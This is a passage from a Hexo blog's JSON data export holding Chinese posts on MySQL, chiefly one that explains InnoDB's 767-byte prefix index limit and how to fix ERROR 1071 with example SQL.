基于表方式无关表结构及内容</h3><p>基于表方式，mysql只检验表名被创建，则开启监控。<br>至于，表创建到哪个数据库、表具体的数据结构、表里的内容都不关心，不会对监控开启有任何影响。</p>\n<h3 id=\"5-日志状态输出时间\"><a href=\"#5-日志状态输出时间\" class=\"headerlink\" title=\"5. 日志状态输出时间\"></a>5. 日志状态输出时间</h3><p>虽说状态日志是每15秒周期性输出一次，但是由于状态收集与输出也会占用一些时间，特别是表空间日志(INNODB TABLE MONITOR OUTPUT)和表日志(INNODB TABLESPACE MONITOR OUTPUT)。因此，两次日志时间并不是规律的间隔15秒，而是自上次输出后15秒加上收集输出监控日志的时间。</p>\n<h2 id=\"五、补充知识\"><a href=\"#五、补充知识\" class=\"headerlink\" title=\"五、补充知识\"></a>五、补充知识</h2><h3 id=\"1-查看错误日志输出位置\"><a href=\"#1-查看错误日志输出位置\" class=\"headerlink\" title=\"1. 查看错误日志输出位置\"></a>1. 查看错误日志输出位置</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">mysql root@localhost:<span class=\"built_in\">test</span>&gt; select @@<span class=\"built_in\">log</span>_error;</div><div class=\"line\">+----------------------------------------+</div><div class=\"line\">| @@<span class=\"built_in\">log</span>_error                            |</div><div class=\"line\">|----------------------------------------|</div><div class=\"line\">| /usr/<span class=\"built_in\">local</span>/mysql/data/mysqld.local.err |</div><div class=\"line\">+----------------------------------------+</div></pre></td></tr></table></figure>\n<h3 id=\"2-查看历史日志开启状态与输出位置\"><a href=\"#2-查看历史日志开启状态与输出位置\" class=\"headerlink\" title=\"2. 查看历史日志开启状态与输出位置\"></a>2. 查看历史日志开启状态与输出位置</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">mysql root@localhost:<span class=\"built_in\">test</span>&gt; show VARIABLES like <span class=\"string\">'general%'</span>;</div><div class=\"line\">+------------------+---------------------------------------+</div><div class=\"line\">| Variable_name    | Value                                 |</div><div class=\"line\">|------------------+---------------------------------------|</div><div class=\"line\">| general_<span class=\"built_in\">log</span>      | ON                                    |</div><div class=\"line\">| general_<span class=\"built_in\">log</span>_file | /usr/<span class=\"built_in\">local</span>/mysql/data/yerba-buena.log |</div><div class=\"line\">+------------------+---------------------------------------+</div></pre></td></tr></table></figure>\n<h3 id=\"3-监控日志解读\"><a href=\"#3-监控日志解读\" class=\"headerlink\" title=\"3. 监控日志解读\"></a>3. 监控日志解读</h3><p>详见参考文档2及参考文档5</p>\n<h2 id=\"六、参考文档\"><a href=\"#六、参考文档\" class=\"headerlink\" title=\"六、参考文档\"></a>六、参考文档</h2><ol>\n<li><a href=\"https://dev.mysql.com/doc/refman/5.6/en/innodb-enabling-monitors.html\">Enabling InnoDB Monitors</a></li>\n<li><a href=\"https://dev.mysql.com/doc/refman/5.6/en/innodb-standard-monitor.html\">InnoDB Standard Monitor and Lock Monitor Output</a></li>\n<li><a href=\"http://www.xaprb.com/blog/2007/09/18/how-to-debug-innodb-lock-waits/\">How to debug InnoDB lock waits</a></li>\n<li><a href=\"http://www.xaprb.com/blog/2006/07/31/how-to-analyze-innodb-mysql-locks/\">How to find out who is locking a table in MySQL</a></li>\n<li><a href=\"http://blog.csdn.net/zyz511919766/article/details/50147283\">InnoDB Monitor</a></li>\n<li><a href=\"http://blog.sina.com.cn/s/blog_5037eacb0102vj1w.html\">INNODB监控开关</a></li>\n</ol>"},{"title":"mysql前缀索引大小限制","date":"2016-08-04T03:06:00.000Z","_content":"<img src=\"/asserts/images/logo/mysql.png\" class=\"img-logo img-center\" />\n\n\n## 一、背景\n更改数据表存储引擎由MyISAM修改为INNODB，提示如下错误：\nERROR 1071: Specified key was too long; max key length is 767 bytes\n\n\n## 二、问题描述\n今有一张数据表如下，其结构如下：\n``` sql\nCREATE TABLE IF NOT EXISTS `base_info`\n(\n  `id` bigint(20) NOT NULL DEFAULT '0' COMMENT 'ID',\n  `name` varchar(256) DEFAULT NULL COMMENT '名称',\n  `urls` varchar(1000) DEFAULT NULL COMMENT '链接',\n  `partition_month` varchar(256) NOT NULL DEFAULT '' COMMENT '快照月份',\n  PRIMARY KEY (`id`,`partition_month`)\n) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='基础信息表';\n```\n\n由于基于此表可能会用到事务。因此，MyISAM不满足需求，需要将表ENGINE修改为INNODB。\n具体SQL语句如下：\n``` sql\nALTER TABLE `base_info`\nENGINE = InnoDB;\n```\n\n\n## 三、解决方案\n\n### 1. 原因分析\n不同的数据表存储引擎限制的索引长度不一。\n数据表存储引擎MyISAM最大索引长度为 **1000B**，而INNODB默认最大索引长度为**767B**。\n\n上述问题涉及的primary key中partition_month长度为 **256 * 3B = 768B > 767B**。\n\n### 2. 问题处理\n修改索引字段长度，并指定用于索引建立的前缀长度。\n目前能想到的问题处理方案有如下两种：\n\n#### 基于业务场景\n根据业务需求调整不合理的字段类型或者长度。本案例就属于这类情况。\n\n从业务角度来看，partition_month值形如：201607。\n因此，可以将字段类型调整长度为int类型或者将partition_month字符长度设置成 char(6) 即可。\n``` sql\nALTER TABLE `test`.`base_info`\nDROP PRIMARY KEY,\nADD PRIMARY KEY (`id`, `partition_month`(6));\n```\n\n#### 基于数据区分度\n根据具体的数据区分度来设置前缀索引长度。\n\n假设需要为urls建立索引，可以事先查看当前字段应用不同前缀长度的区分度。\n如下是取当前urls前缀长度为1000、100、125、150、200时的数据区分度：\n``` sql\nselect count(distinct urls)/count(*) as urls_full, count(distinct left(urls,100))/count(*) as urls_100, count(distinct left(urls,125))/count(*) as urls_125, count(distinct left(urls,150))/count(*) as urls_150, count(distinct left(urls,200))/count(*) as urls_200 from base_info;\n+----------+----------+----------+----------+----------+\n| urls_full | urls_100 | urls_125 | urls_150 | urls_200 |\n+----------+----------+----------+----------+----------+\n|   0.9859 |   0.9858 |   0.9858 |   0.9859 |   0.9859 |\n+----------+----------+----------+----------+----------+\n```\n\n从结果可以看出，当urls取前缀长度为150时，其区分度与完整长度一致。\n\n<!-- more -->\n\n## 四、知识点\n\n### 1. 前缀索引介绍\n对于string类型的字段而言，可以使用字段值的主要部分用作索引。其语法为：`col_name(length)`，用以指定索引前缀长度。\nCHAR, VARCHAR, BINARY, and VARBINARY 类型字段可以使用前缀索引。\nBLOB and TEXT 类型字段必须使用前缀索引。\n\n前缀索引长度单位为字节(bytes)。然而，CREATE TABLE、ALTER TABLE、CREATE INDEX 语句涉及的字段长度单位有如下两种情况：对于非二进制类型(CHAR, VARCHAR, TEXT)字段而言，这个长度指的是字符数；而对于二进制(BINARY, VARBINARY, BLOB)字段而言，这个长度指的是字节数。\n\n官方说明(详见参考文档2):\n> For string columns, indexes can be created that use only the leading part of column values, using col_name(length) syntax to specify an index prefix length:\nPrefixes can be specified for CHAR, VARCHAR, BINARY, and VARBINARY column indexes.\nPrefixes must be specified for BLOB and TEXT column indexes.\nPrefix limits are measured in bytes, whereas the prefix length in CREATE TABLE, ALTER TABLE, and CREATE INDEX statements is interpreted as number of characters for nonbinary string types (CHAR, VARCHAR, TEXT) and number of bytes for binary string types (BINARY, VARBINARY, BLOB). Take this into account when specifying a prefix length for a nonbinary string column that uses a multibyte character set.\nFor spatial columns, prefix values cannot be given, as described later in this section.\n\n### 2. 字符占用大小计算\n字符长度转换成字节数时，需要考虑表字段的字符编码方式。\n简单来说，就是字符编码方式不同，1个字符占用的字节数不同。\n\n常用的字符编码方式与对应的占用大小关系如下：\n\n| 字符编码 | 字符占用大小 |\n|---|---|\n| latin | 单字节：1B |\n| GBK | 双字节：2B |\n| UTF8 | 三字节：3B |\n| UTF8mb4 | 四字节：4B |\n\n### 3. 前缀索引限制\n是否支持前缀索引以及前缀索引长度大小，依赖于数据表使用的存储引擎。\n对于INNODB存储引擎而言，默认前缀长度最大能支持767字节；而在开启`innodb_large_prefix`属性值的情况下，最大能支持3072字节。\n对于MyISAM存储引擎而言，前缀长度限制为1000字节。\n对于NDB存储引擎而言，并不支持前缀索引。\n\n官方说明(详见参考文档2):\n> Prefix support and lengths of prefixes (where supported) are storage engine dependent. For example, a prefix can be up to 767 bytes long for InnoDB tables or 3072 bytes if the innodb_large_prefix option is enabled. For MyISAM tables, the prefix limit is 1000 bytes. The NDB storage engine does not support prefixes (see Section 18.1.6.6, “Unsupported or Missing Features in MySQL Cluster”).\n\n\n\n## 五、参考文档\n1. [1071 - Specified key was too long; max key length is 767 bytes](http://stackoverflow.com/a/1814594)\n2. [CREATE INDEX Syntax](http://dev.mysql.com/doc/refman/5.6/en/create-index.html)\n4. [认识mysql前缀索引](http://hidba.org/?p=216)","source":"_posts/article/database/mysql前缀索引大小限制.md","raw":"title: mysql前缀索引大小限制\ntags:\n  - mysql\n  - 索引\ncategories:\n  - 数据存储\ndate: 2016-08-04 11:06:00\n---\n<img src=\"/asserts/images/logo/mysql.png\" class=\"img-logo img-center\" />\n\n\n## 一、背景\n更改数据表存储引擎由MyISAM修改为INNODB，提示如下错误：\nERROR 1071: Specified key was too long; max key length is 767 bytes\n\n\n## 二、问题描述\n今有一张数据表如下，其结构如下：\n``` sql\nCREATE TABLE IF NOT EXISTS `base_info`\n(\n  `id` bigint(20) NOT NULL DEFAULT '0' COMMENT 'ID',\n  `name` varchar(256) DEFAULT NULL COMMENT '名称',\n  `urls` varchar(1000) DEFAULT NULL COMMENT '链接',\n  `partition_month` varchar(256) NOT NULL DEFAULT '' COMMENT '快照月份',\n  PRIMARY KEY (`id`,`partition_month`)\n) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='基础信息表';\n```\n\n由于基于此表可能会用到事务。因此，MyISAM不满足需求，需要将表ENGINE修改为INNODB。\n具体SQL语句如下：\n``` sql\nALTER TABLE `base_info`\nENGINE = InnoDB;\n```\n\n\n## 三、解决方案\n\n### 1. 原因分析\n不同的数据表存储引擎限制的索引长度不一。\n数据表存储引擎MyISAM最大索引长度为 **1000B**，而INNODB默认最大索引长度为**767B**。\n\n上述问题涉及的primary key中partition_month长度为 **256 * 3B = 768B > 767B**。\n\n### 2. 问题处理\n修改索引字段长度，并指定用于索引建立的前缀长度。\n目前能想到的问题处理方案有如下两种：\n\n#### 基于业务场景\n根据业务需求调整不合理的字段类型或者长度。本案例就属于这类情况。\n\n从业务角度来看，partition_month值形如：201607。\n因此，可以将字段类型调整长度为int类型或者将partition_month字符长度设置成 char(6) 即可。\n``` sql\nALTER TABLE `test`.`base_info`\nDROP PRIMARY KEY,\nADD PRIMARY KEY (`id`, `partition_month`(6));\n```\n\n#### 基于数据区分度\n根据具体的数据区分度来设置前缀索引长度。\n\n假设需要为urls建立索引，可以事先查看当前字段应用不同前缀长度的区分度。\n如下是取当前urls前缀长度为1000、100、125、150、200时的数据区分度：\n``` sql\nselect count(distinct urls)/count(*) as urls_full, count(distinct left(urls,100))/count(*) as urls_100, count(distinct left(urls,125))/count(*) as urls_125, count(distinct left(urls,150))/count(*) as urls_150, count(distinct left(urls,200))/count(*) as urls_200 from base_info;\n+----------+----------+----------+----------+----------+\n| urls_full | urls_100 | urls_125 | urls_150 | urls_200 |\n+----------+----------+----------+----------+----------+\n|   0.9859 |   0.9858 |   0.9858 |   0.9859 |   0.9859 |\n+----------+----------+----------+----------+----------+\n```\n\n从结果可以看出，当urls取前缀长度为150时，其区分度与完整长度一致。\n\n<!-- more -->\n\n## 四、知识点\n\n### 1. 前缀索引介绍\n对于string类型的字段而言，可以使用字段值的主要部分用作索引。其语法为：`col_name(length)`，用以指定索引前缀长度。\nCHAR, VARCHAR, BINARY, and VARBINARY 类型字段可以使用前缀索引。\nBLOB and TEXT 类型字段必须使用前缀索引。\n\n前缀索引长度单位为字节(bytes)。然而，CREATE TABLE、ALTER TABLE、CREATE INDEX 语句涉及的字段长度单位有如下两种情况：对于非二进制类型(CHAR, VARCHAR, TEXT)字段而言，这个长度指的是字符数；而对于二进制(BINARY, VARBINARY, BLOB)字段而言，这个长度指的是字节数。\n\n官方说明(详见参考文档2):\n> For string columns, indexes can be created that use only the leading part of column values, using col_name(length) syntax to specify an index prefix length:\nPrefixes can be specified for CHAR, VARCHAR, BINARY, and VARBINARY column indexes.\nPrefixes must be specified for BLOB and TEXT column indexes.\nPrefix limits are measured in bytes, whereas the prefix length in CREATE TABLE, ALTER TABLE, and CREATE INDEX statements is interpreted as number of characters for nonbinary string types (CHAR, VARCHAR, TEXT) and number of bytes for binary string types (BINARY, VARBINARY, BLOB). Take this into account when specifying a prefix length for a nonbinary string column that uses a multibyte character set.\nFor spatial columns, prefix values cannot be given, as described later in this section.\n\n### 2. 字符占用大小计算\n字符长度转换成字节数时，需要考虑表字段的字符编码方式。\n简单来说，就是字符编码方式不同，1个字符占用的字节数不同。\n\n常用的字符编码方式与对应的占用大小关系如下：\n\n| 字符编码 | 字符占用大小 |\n|---|---|\n| latin | 单字节：1B |\n| GBK | 双字节：2B |\n| UTF8 | 三字节：3B |\n| UTF8mb4 | 四字节：4B |\n\n### 3. 前缀索引限制\n是否支持前缀索引以及前缀索引长度大小，依赖于数据表使用的存储引擎。\n对于INNODB存储引擎而言，默认前缀长度最大能支持767字节；而在开启`innodb_large_prefix`属性值的情况下，最大能支持3072字节。\n对于MyISAM存储引擎而言，前缀长度限制为1000字节。\n对于NDB存储引擎而言，并不支持前缀索引。\n\n官方说明(详见参考文档2):\n> Prefix support and lengths of prefixes (where supported) are storage engine dependent. For example, a prefix can be up to 767 bytes long for InnoDB tables or 3072 bytes if the innodb_large_prefix option is enabled. For MyISAM tables, the prefix limit is 1000 bytes. The NDB storage engine does not support prefixes (see Section 18.1.6.6, “Unsupported or Missing Features in MySQL Cluster”).\n\n\n\n## 五、参考文档\n1. [1071 - Specified key was too long; max key length is 767 bytes](http://stackoverflow.com/a/1814594)\n2. [CREATE INDEX Syntax](http://dev.mysql.com/doc/refman/5.6/en/create-index.html)\n4. [认识mysql前缀索引](http://hidba.org/?p=216)","slug":"article/database/mysql前缀索引大小限制","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxrj002e5nbt1tb2gov3","content":"<p><img src=\"/asserts/images/logo/mysql.png\" class=\"img-logo img-center\"></p>\n<h2 id=\"一、背景\"><a href=\"#一、背景\" class=\"headerlink\" title=\"一、背景\"></a>一、背景</h2><p>更改数据表存储引擎由MyISAM修改为INNODB，提示如下错误：<br>ERROR 1071: Specified key was too long; max key length is 767 bytes</p>\n<h2 id=\"二、问题描述\"><a href=\"#二、问题描述\" class=\"headerlink\" title=\"二、问题描述\"></a>二、问题描述</h2><p>今有一张数据表如下，其结构如下：<br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">CREATE</span> <span class=\"keyword\">TABLE</span> <span class=\"keyword\">IF</span> <span class=\"keyword\">NOT</span> <span class=\"keyword\">EXISTS</span> <span class=\"string\">`base_info`</span></div><div class=\"line\">(</div><div class=\"line\">  <span class=\"string\">`id`</span> <span class=\"built_in\">bigint</span>(<span class=\"number\">20</span>) <span class=\"keyword\">NOT</span> <span class=\"literal\">NULL</span> <span class=\"keyword\">DEFAULT</span> <span class=\"string\">'0'</span> <span class=\"keyword\">COMMENT</span> <span class=\"string\">'ID'</span>,</div><div class=\"line\">  <span class=\"string\">`name`</span> <span class=\"built_in\">varchar</span>(<span class=\"number\">256</span>) <span class=\"keyword\">DEFAULT</span> <span class=\"literal\">NULL</span> <span class=\"keyword\">COMMENT</span> <span class=\"string\">'名称'</span>,</div><div class=\"line\">  <span class=\"string\">`urls`</span> <span class=\"built_in\">varchar</span>(<span class=\"number\">1000</span>) <span class=\"keyword\">DEFAULT</span> <span class=\"literal\">NULL</span> <span class=\"keyword\">COMMENT</span> <span class=\"string\">'链接'</span>,</div><div class=\"line\">  <span class=\"string\">`partition_month`</span> <span class=\"built_in\">varchar</span>(<span class=\"number\">256</span>) <span class=\"keyword\">NOT</span> <span class=\"literal\">NULL</span> <span class=\"keyword\">DEFAULT</span> <span class=\"string\">''</span> <span class=\"keyword\">COMMENT</span> <span class=\"string\">'快照月份'</span>,</div><div class=\"line\">  PRIMARY <span class=\"keyword\">KEY</span> (<span class=\"string\">`id`</span>,<span class=\"string\">`partition_month`</span>)</div><div class=\"line\">) <span class=\"keyword\">ENGINE</span>=MyISAM <span class=\"keyword\">DEFAULT</span> <span class=\"keyword\">CHARSET</span>=utf8 <span class=\"keyword\">COMMENT</span>=<span class=\"string\">'基础信息表'</span>;</div></pre></td></tr></table></figure></p>\n<p>由于基于此表可能会用到事务。因此，MyISAM不满足需求，需要将表ENGINE修改为INNODB。<br>具体SQL语句如下：<br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">ALTER</span> <span class=\"keyword\">TABLE</span> <span class=\"string\">`base_info`</span></div><div class=\"line\"><span class=\"keyword\">ENGINE</span> = <span class=\"keyword\">InnoDB</span>;</div></pre></td></tr></table></figure></p>\n<h2 id=\"三、解决方案\"><a href=\"#三、解决方案\" class=\"headerlink\" title=\"三、解决方案\"></a>三、解决方案</h2><h3 id=\"1-原因分析\"><a href=\"#1-原因分析\" class=\"headerlink\" title=\"1. 原因分析\"></a>1. 原因分析</h3><p>不同的数据表存储引擎限制的索引长度不一。<br>数据表存储引擎MyISAM最大索引长度为 <strong>1000B</strong>，而INNODB默认最大索引长度为<strong>767B</strong>。</p>\n<p>上述问题涉及的primary key中partition_month长度为 <strong>256 * 3B = 768B &gt; 767B</strong>。</p>\n<h3 id=\"2-问题处理\"><a href=\"#2-问题处理\" class=\"headerlink\" title=\"2. 问题处理\"></a>2. 问题处理</h3><p>修改索引字段长度，并指定用于索引建立的前缀长度。<br>目前能想到的问题处理方案有如下两种：</p>\n<h4 id=\"基于业务场景\"><a href=\"#基于业务场景\" class=\"headerlink\" title=\"基于业务场景\"></a>基于业务场景</h4><p>根据业务需求调整不合理的字段类型或者长度。本案例就属于这类情况。</p>\n<p>从业务角度来看，partition_month值形如：201607。<br>因此，可以将字段类型调整长度为int类型或者将partition_month字符长度设置成 char(6) 即可。<br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">ALTER</span> <span class=\"keyword\">TABLE</span> <span class=\"string\">`test`</span>.<span class=\"string\">`base_info`</span></div><div class=\"line\"><span class=\"keyword\">DROP</span> PRIMARY <span class=\"keyword\">KEY</span>,</div><div class=\"line\"><span class=\"keyword\">ADD</span> PRIMARY <span class=\"keyword\">KEY</span> (<span class=\"string\">`id`</span>, <span class=\"string\">`partition_month`</span>(<span class=\"number\">6</span>));</div></pre></td></tr></table></figure></p>\n<h4 id=\"基于数据区分度\"><a href=\"#基于数据区分度\" class=\"headerlink\" title=\"基于数据区分度\"></a>基于数据区分度</h4><p>根据具体的数据区分度来设置前缀索引长度。</p>\n<p>假设需要为urls建立索引，可以事先查看当前字段应用不同前缀长度的区分度。<br>如下是取当前urls前缀长度为1000、100、125、150、200时的数据区分度：<br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">select</span> <span class=\"keyword\">count</span>(<span class=\"keyword\">distinct</span> urls)/<span class=\"keyword\">count</span>(*) <span class=\"keyword\">as</span> urls_full, <span class=\"keyword\">count</span>(<span class=\"keyword\">distinct</span> <span class=\"keyword\">left</span>(urls,<span class=\"number\">100</span>))/<span class=\"keyword\">count</span>(*) <span class=\"keyword\">as</span> urls_100, <span class=\"keyword\">count</span>(<span class=\"keyword\">distinct</span> <span class=\"keyword\">left</span>(urls,<span class=\"number\">125</span>))/<span class=\"keyword\">count</span>(*) <span class=\"keyword\">as</span> urls_125, <span class=\"keyword\">count</span>(<span class=\"keyword\">distinct</span> <span class=\"keyword\">left</span>(urls,<span class=\"number\">150</span>))/<span class=\"keyword\">count</span>(*) <span class=\"keyword\">as</span> urls_150, <span class=\"keyword\">count</span>(<span class=\"keyword\">distinct</span> <span class=\"keyword\">left</span>(urls,<span class=\"number\">200</span>))/<span class=\"keyword\">count</span>(*) <span class=\"keyword\">as</span> urls_200 <span class=\"keyword\">from</span> base_info;</div><div class=\"line\">+<span class=\"comment\">----------+----------+----------+----------+----------+</span></div><div class=\"line\">| urls_full | urls_100 | urls_125 | urls_150 | urls_200 |</div><div class=\"line\">+<span class=\"comment\">----------+----------+----------+----------+----------+</span></div><div class=\"line\">|   0.9859 |   0.9858 |   0.9858 |   0.9859 |   0.9859 |</div><div class=\"line\">+<span class=\"comment\">----------+----------+----------+----------+----------+</span></div></pre></td></tr></table></figure></p>\n<p>从结果可以看出，当urls取前缀长度为150时，其区分度与完整长度一致。</p>\n<a id=\"more\"></a>\n<h2 id=\"四、知识点\"><a href=\"#四、知识点\" class=\"headerlink\" title=\"四、知识点\"></a>四、知识点</h2><h3 id=\"1-前缀索引介绍\"><a href=\"#1-前缀索引介绍\" class=\"headerlink\" title=\"1. 前缀索引介绍\"></a>1. 前缀索引介绍</h3><p>对于string类型的字段而言，可以使用字段值的主要部分用作索引。其语法为：<code>col_name(length)</code>，用以指定索引前缀长度。<br>CHAR, VARCHAR, BINARY, and VARBINARY 类型字段可以使用前缀索引。<br>BLOB and TEXT 类型字段必须使用前缀索引。</p>\n<p>前缀索引长度单位为字节(bytes)。然而，CREATE TABLE、ALTER TABLE、CREATE INDEX 语句涉及的字段长度单位有如下两种情况：对于非二进制类型(CHAR, VARCHAR, TEXT)字段而言，这个长度指的是字符数；而对于二进制(BINARY, VARBINARY, BLOB)字段而言，这个长度指的是字节数。</p>\n<p>官方说明(详见参考文档2):</p>\n<blockquote>\n<p>For string columns, indexes can be created that use only the leading part of column values, using col_name(length) syntax to specify an index prefix length:<br>Prefixes can be specified for CHAR, VARCHAR, BINARY, and VARBINARY column indexes.<br>Prefixes must be specified for BLOB and TEXT column indexes.<br>Prefix limits are measured in bytes, whereas the prefix length in CREATE TABLE, ALTER TABLE, and CREATE INDEX statements is interpreted as number of characters for nonbinary string types (CHAR, VARCHAR, TEXT) and number of bytes for binary string types (BINARY, VARBINARY, BLOB). Take this into account when specifying a prefix length for a nonbinary string column that uses a multibyte character set.<br>For spatial columns, prefix values cannot be given, as described later in this section.</p>\n</blockquote>\n<h3 id=\"2-字符占用大小计算\"><a href=\"#2-字符占用大小计算\" class=\"headerlink\" title=\"2. 字符占用大小计算\"></a>2. 字符占用大小计算</h3><p>字符长度转换成字节数时，需要考虑表字段的字符编码方式。<br>简单来说，就是字符编码方式不同，1个字符占用的字节数不同。</p>\n<p>常用的字符编码方式与对应的占用大小关系如下：</p>\n<table>\n<thead>\n<tr>\n<th>字符编码</th>\n<th>字符占用大小</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>latin</td>\n<td>单字节：1B</td>\n</tr>\n<tr>\n<td>GBK</td>\n<td>双字节：2B</td>\n</tr>\n<tr>\n<td>UTF8</td>\n<td>三字节：3B</td>\n</tr>\n<tr>\n<td>UTF8mb4</td>\n<td>四字节：4B</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"3-前缀索引限制\"><a href=\"#3-前缀索引限制\" class=\"headerlink\" title=\"3. 前缀索引限制\"></a>3. 前缀索引限制</h3><p>是否支持前缀索引以及前缀索引长度大小，依赖于数据表使用的存储引擎。<br>对于INNODB存储引擎而言，默认前缀长度最大能支持767字节；而在开启<code>innodb_large_prefix</code>属性值的情况下，最大能支持3072字节。<br>对于MyISAM存储引擎而言，前缀长度限制为1000字节。<br>对于NDB存储引擎而言，并不支持前缀索引。</p>\n<p>官方说明(详见参考文档2):</p>\n<blockquote>\n<p>Prefix support and lengths of prefixes (where supported) are storage engine dependent. For example, a prefix can be up to 767 bytes long for InnoDB tables or 3072 bytes if the innodb_large_prefix option is enabled. For MyISAM tables, the prefix limit is 1000 bytes. The NDB storage engine does not support prefixes (see Section 18.1.6.6, “Unsupported or Missing Features in MySQL Cluster”).</p>\n</blockquote>\n<h2 id=\"五、参考文档\"><a href=\"#五、参考文档\" class=\"headerlink\" title=\"五、参考文档\"></a>五、参考文档</h2><ol>\n<li><a href=\"http://stackoverflow.com/a/1814594\" target=\"_blank\" rel=\"external\">1071 - Specified key was too long; max key length is 767 bytes</a></li>\n<li><a href=\"http://dev.mysql.com/doc/refman/5.6/en/create-index.html\" target=\"_blank\" rel=\"external\">CREATE INDEX Syntax</a></li>\n<li><a href=\"http://hidba.org/?p=216\" target=\"_blank\" rel=\"external\">认识mysql前缀索引</a></li>\n</ol>\n","excerpt":"<p><img src=\"/asserts/images/logo/mysql.png\" class=\"img-logo img-center\" /></p>\n<h2 id=\"一、背景\"><a href=\"#一、背景\" class=\"headerlink\" title=\"一、背景\"></a>一、背景</h2><p>更改数据表存储引擎由MyISAM修改为INNODB，提示如下错误：<br>ERROR 1071: Specified key was too long; max key length is 767 bytes</p>\n<h2 id=\"二、问题描述\"><a href=\"#二、问题描述\" class=\"headerlink\" title=\"二、问题描述\"></a>二、问题描述</h2><p>今有一张数据表如下，其结构如下：<br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">CREATE</span> <span class=\"keyword\">TABLE</span> <span class=\"keyword\">IF</span> <span class=\"keyword\">NOT</span> <span class=\"keyword\">EXISTS</span> <span class=\"string\">`base_info`</span></div><div class=\"line\">(</div><div class=\"line\">  <span class=\"string\">`id`</span> <span class=\"built_in\">bigint</span>(<span class=\"number\">20</span>) <span class=\"keyword\">NOT</span> <span class=\"literal\">NULL</span> <span class=\"keyword\">DEFAULT</span> <span class=\"string\">'0'</span> <span class=\"keyword\">COMMENT</span> <span class=\"string\">'ID'</span>,</div><div class=\"line\">  <span class=\"string\">`name`</span> <span class=\"built_in\">varchar</span>(<span class=\"number\">256</span>) <span class=\"keyword\">DEFAULT</span> <span class=\"literal\">NULL</span> <span class=\"keyword\">COMMENT</span> <span class=\"string\">'名称'</span>,</div><div class=\"line\">  <span class=\"string\">`urls`</span> <span class=\"built_in\">varchar</span>(<span class=\"number\">1000</span>) <span class=\"keyword\">DEFAULT</span> <span class=\"literal\">NULL</span> <span class=\"keyword\">COMMENT</span> <span class=\"string\">'链接'</span>,</div><div class=\"line\">  <span class=\"string\">`partition_month`</span> <span class=\"built_in\">varchar</span>(<span class=\"number\">256</span>) <span class=\"keyword\">NOT</span> <span class=\"literal\">NULL</span> <span class=\"keyword\">DEFAULT</span> <span class=\"string\">''</span> <span class=\"keyword\">COMMENT</span> <span class=\"string\">'快照月份'</span>,</div><div class=\"line\">  PRIMARY <span class=\"keyword\">KEY</span> (<span class=\"string\">`id`</span>,<span class=\"string\">`partition_month`</span>)</div><div class=\"line\">) <span class=\"keyword\">ENGINE</span>=MyISAM <span class=\"keyword\">DEFAULT</span> <span class=\"keyword\">CHARSET</span>=utf8 <span class=\"keyword\">COMMENT</span>=<span class=\"string\">'基础信息表'</span>;</div></pre></td></tr></table></figure></p>\n<p>由于基于此表可能会用到事务。因此，MyISAM不满足需求，需要将表ENGINE修改为INNODB。<br>具体SQL语句如下：<br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">ALTER</span> <span class=\"keyword\">TABLE</span> <span class=\"string\">`base_info`</span></div><div class=\"line\"><span class=\"keyword\">ENGINE</span> = <span class=\"keyword\">InnoDB</span>;</div></pre></td></tr></table></figure></p>\n<h2 id=\"三、解决方案\"><a href=\"#三、解决方案\" class=\"headerlink\" title=\"三、解决方案\"></a>三、解决方案</h2><h3 id=\"1-原因分析\"><a href=\"#1-原因分析\" class=\"headerlink\" title=\"1. 原因分析\"></a>1. 原因分析</h3><p>不同的数据表存储引擎限制的索引长度不一。<br>数据表存储引擎MyISAM最大索引长度为 <strong>1000B</strong>，而INNODB默认最大索引长度为<strong>767B</strong>。</p>\n<p>上述问题涉及的primary key中partition_month长度为 <strong>256 * 3B = 768B &gt; 767B</strong>。</p>\n<h3 id=\"2-问题处理\"><a href=\"#2-问题处理\" class=\"headerlink\" title=\"2. 问题处理\"></a>2. 问题处理</h3><p>修改索引字段长度，并指定用于索引建立的前缀长度。<br>目前能想到的问题处理方案有如下两种：</p>\n<h4 id=\"基于业务场景\"><a href=\"#基于业务场景\" class=\"headerlink\" title=\"基于业务场景\"></a>基于业务场景</h4><p>根据业务需求调整不合理的字段类型或者长度。本案例就属于这类情况。</p>\n<p>从业务角度来看，partition_month值形如：201607。<br>因此，可以将字段类型调整长度为int类型或者将partition_month字符长度设置成 char(6) 